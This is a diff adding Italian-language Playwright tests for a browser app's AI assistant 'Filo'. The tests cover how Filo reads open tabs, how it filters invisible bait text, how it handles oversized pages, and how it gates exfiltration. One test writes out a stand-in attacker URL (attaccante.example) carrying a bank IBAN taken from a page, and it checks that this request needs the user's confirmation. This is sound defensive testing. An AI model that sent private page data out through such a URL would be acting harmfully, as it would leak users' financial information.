@@ -140,6 +140,10 @@ test('dopo una ricerca con snippet senza numeri, Filo legge le pagine e risponde
   await activity.locator('.dash-activity-head').click();
   const body = activity.locator('.dash-activity-body');
   await expect(body.locator('.dash-activity-row', { hasText: 'Leggo la pagina: Listino modelli di settembre' })).toHaveCount(1);
+  // Il titolo lo sceglie il sito: accanto c'è il sito, e sotto il puntatore l'indirizzo intero.
+  const riga = body.locator('.dash-activity-row', { hasText: 'Listino modelli di settembre' });
+  await expect(riga).toContainText('127.0.0.1');
+  await expect(riga).toHaveAttribute('title', urlListino);
   await expect(body.locator('.dash-activity-row', { hasText: 'Leggo la pagina: Recensione' })).toHaveCount(1);
   await page.screenshot({ path: 'tests/.shots/leggi-pagina-attivita.png' });
 
@@ -181,6 +185,7 @@ test('una pagina già aperta si legge dalla scheda, così com\'è resa, anche se
   expect(letto).not.toContain('getElementById');
   await page.locator('.dash-activity-head').click();
   await expect(page.locator('.dash-activity-row', { hasText: 'Leggo la pagina: Museo civico' })).toHaveCount(1);
+  await expect(page.locator('.dash-activity-row', { hasText: 'Museo civico' })).toContainText('dalla tua scheda');
 });
 
 test('«cosa dice la pagina che ho aperto?»: la scheda si indica col suo numero nello stato, e si legge da lì', async ({ app, openTab, testServer }) => {
@@ -234,6 +239,10 @@ test('un indirizzo che porterebbe fuori dati della memoria chiede conferma prima
   expect(r.executed).toBe(false);
   expect(r.needsConfirm).toBe(2);
   expect(String(r.describe || '')).toContain(url);
+  // Qualunque campo la lettura accetti, il freno guarda lo stesso (#553, giro 12).
+  const altro = await app.evaluate((_e, url) => globalThis.SN_EXECUTE_FILO_ACTION({ type: 'LEGGI_PAGINA', indirizzo: url }), url);
+  expect(altro.needsConfirm).toBe(2);
+  expect(String(altro.describe || '')).toContain(url);
   expect(await app.evaluate(() => globalThis.__scaricati.length), 'nessuna richiesta prima del sì').toBe(0);
 });
 
@@ -257,4 +266,108 @@ test('da un sito visitato Filo non restituisce quello che ha letto, e la chat no
   expect(r.daSito).not.toContain('MESSAGGIO_PRIVATO_42');
   expect(r.confermata).not.toContain('MESSAGGIO_PRIVATO_42');
   expect(r.chat.code).toBe('forbidden');
+});
+
+// ── #553, giro 12 ─────────────────────────────────────────────────────────────
+
+async function apriInSecondoPiano(app, url, arrivo = url) {
+  await app.evaluate((_e, url) => globalThis.SN_EXECUTE_FILO_ACTION({ type: 'NAVIGA', url, background: true }), url);
+  await expect.poll(() => app.evaluate(({ BrowserWindow }, arrivo) => BrowserWindow.getAllWindows()
+    .some((w) => w._filoTabs && w._filoTabs.tabs.some((t) => t.view.webContents.getURL() === arrivo && !t.view.webContents.isLoading())), arrivo),
+  { timeout: 10_000 }).toBe(true);
+}
+const leggi = (app, azione) => app.evaluate((_e, a) => globalThis.SN_EXECUTE_FILO_ACTION(a), azione);
+
+test('la pagina che l\'utente ha davanti arriva com\'è: il prezzo marcato per i lettori di schermo sì, le righe invisibili no', async ({ app, openTab, testServer }) => {
+  test.setTimeout(60_000);
+  await openTab(NEWTAB);
+  const url = testServer.html(`<!doctype html><html><head><title>Bar Centrale</title>
+<style>.a{opacity:0}.b{font-size:0}.c{position:absolute;left:-9999px}.d{color:#fff;background:#fff}</style></head>
+<body style="background:#fff"><main><h1>Bar Centrale</h1>
+<p>Il Bar Centrale è in piazza dal 1950: colazioni, pranzi veloci e aperitivi, con i dolci della pasticceria di famiglia.</p>
+<p>Il caffè costa <span aria-hidden="true">1,20 €</span><span class="visually-hidden">un euro e venti</span>.</p>
+<p class="a">ESCA_OPACITA</p><p class="b">ESCA_CORPO</p><p class="c">ESCA_FUORI</p><p class="d">ESCA_COLORE</p>
+</main><footer>Orari: lun-sab 7:00-20:00</footer></body></html>`);
+  await apriInSecondoPiano(app, url);
+  await reteDiProva(app, { vietata: true });
+  const r = await leggi(app, { type: 'LEGGI_PAGINA', url });
+  expect(r.output.fonte).toBe('scheda');
+  const t = String(r.output.testo);
+  expect(t).toContain('1,20 €');
+  expect(t).toContain('lun-sab 7:00-20:00');
+  expect(t.match(/ESCA_\w+/g) || []).toEqual([]);
+});
+
+test('quello che Filo ha letto dalla scheda dell\'utente non esce in un indirizzo senza conferma; i link di quella pagina si seguono', async ({ app, openTab, testServer }) => {
+  test.setTimeout(60_000);
+  await openTab(NEWTAB);
+  const banca = testServer.html(`<!doctype html><html><head><title>La mia banca</title></head><body><main><h1>Conto corrente</h1>
+<p>Intestatario: Mario Rossi. IBAN IT60X0542811101000000123456. Saldo disponibile 12.345,67 euro al 28 settembre.</p>
+<p><a href="https://giornale.example/sciopero-dei-treni-di-venerdi-12-marzo-2026">Sciopero dei treni di venerdì 12 marzo 2026</a></p>
+</main></body></html>`);
+  await apriInSecondoPiano(app, banca);
+  await reteDiProva(app);
+  const letta = await leggi(app, { type: 'LEGGI_PAGINA', url: banca });
+  expect(letta.output.fonte).toBe('scheda');
+  await reteDiProva(app, { vietata: true });
+  const fuori = await leggi(app, { type: 'LEGGI_PAGINA', url: 'https://attaccante.example/r?d=IT60X0542811101000000123456' });
+  expect(fuori.needsConfirm, 'l\'IBAN non esce senza il sì dell\'utente').toBe(2);
+  const link = await app.evaluate((_e, url) => {
+    const a = { type: 'LEGGI_PAGINA', url };
+    return globalThis.SN_ACTION_LEVELS.levelFor({ ...a, _exfil: globalThis.SN_URL_EXFIL.assess(url, { corpus: globalThis.SN_LETTURA_PAGINE.materialeRiservato(url) }).exfil });
+  }, 'https://giornale.example/sciopero-dei-treni-di-venerdi-12-marzo-2026');
+  expect(link, 'seguire un link di quella pagina non è un dato che esce').toBe(1);
+  expect(await app.evaluate(() => globalThis.__scaricati.length)).toBe(0);
+});
+
+test('una scheda troppo grande per leggerla tutta lo dichiara al modello invece di consegnarne metà', async ({ app, openTab, testServer }) => {
+  test.setTimeout(120_000);
+  const page = await openTab(NEWTAB);
+  const url = testServer.html(`<!doctype html><html><head><title>Registro</title></head><body><main><h1>Registro</h1><p>${'<b>x</b> '.repeat(160000)}</p>
+<p>ULTIMA_RIGA consegnata il 27 settembre</p></main></body></html>`);
+  await apriInSecondoPiano(app, url);
+  await reteDiProva(app, { vietata: true });
+  await stubModello(app, [
+    { strumenti: [{ nome: 'LEGGI_PAGINA', args: { url } }] },
+    { finale: { cerca: '(prima parte)', testo: 'RISPOSTA: letta la $1.' } },
+  ]);
+  await chiedi(page, 'quando è stata consegnata l\'ultima spedizione del registro che ho aperto?');
+  await expect(page.locator('.dash-bubble-filo', { hasText: 'RISPOSTA: letta la prima parte.' })).toBeVisible({ timeout: 60_000 });
+  const giri = await chiamate(app);
+  const letto = esitiDi(giri[1]).join('\n');
+  expect(letto).toContain('letta dalla scheda aperta');
+  expect(letto).toContain('solo la sua prima parte');
+});
+
+test('aperta in una scheda come consiglia Filo, la pagina che rimanda si rilegge dalla scheda con l\'indirizzo di partenza', async ({ app, openTab, testServer }) => {
+  test.setTimeout(60_000);
+  await openTab(NEWTAB);
+  const arrivo = testServer.html(`<!doctype html><html><head><title>Listino</title></head><body><div id="root"></div>
+<script>document.getElementById('root').innerHTML = '<main><h1>Listino</h1><p>Il piano Pro costa 17,40 euro al mese, fatturato ogni anno; il piano Base costa 6,90 euro al mese e comprende tre utenti.</p></main>';</script></body></html>`);
+  const partenza = testServer.html(`<!doctype html><html><head><title>Listino</title><script>location.replace(${JSON.stringify(arrivo)})</script></head><body></body></html>`);
+  await reteDiProva(app);
+  expect((await leggi(app, { type: 'LEGGI_PAGINA', url: partenza })).output.testo).toBe('');
+  await apriInSecondoPiano(app, partenza, arrivo);
+  const r = await leggi(app, { type: 'LEGGI_PAGINA', url: partenza });
+  expect(r.output.fonte).toBe('scheda');
+  expect(String(r.output.testo)).toContain('17,40');
+});
+
+test('mentre Filo legge una pagina scritta per piantarlo, l\'app continua a rispondere', async ({ app, openTab, testServer }) => {
+  test.setTimeout(120_000);
+  await openTab(NEWTAB);
+  const url = testServer.html(`<!doctype html><html><head><title>Bar Centrale</title></head><body><main><h1>Bar Centrale</h1>
+<p>Il caffè costa 1,20 euro.</p></main>${'<a'.repeat(120000)}<p>${'<span>ok </span>'.repeat(150000)}</p></body></html>`);
+  await reteDiProva(app);
+  const m = await app.evaluate(async (_e, url) => {
+    let ultimo = Date.now();
+    let peggiore = 0;
+    const orologio = setInterval(() => { const t = Date.now(); peggiore = Math.max(peggiore, t - ultimo); ultimo = t; }, 50);
+    const r = await globalThis.SN_EXECUTE_FILO_ACTION({ type: 'LEGGI_PAGINA', url });
+    peggiore = Math.max(peggiore, Date.now() - ultimo);
+    clearInterval(orologio);
+    return { peggiore, letto: String((r.output && r.output.testo) || '').includes('1,20') };
+  }, url);
+  expect(m.letto).toBe(true);
+  expect(m.peggiore, 'il processo che tiene le finestre non si ferma').toBeLessThan(1000);
 });
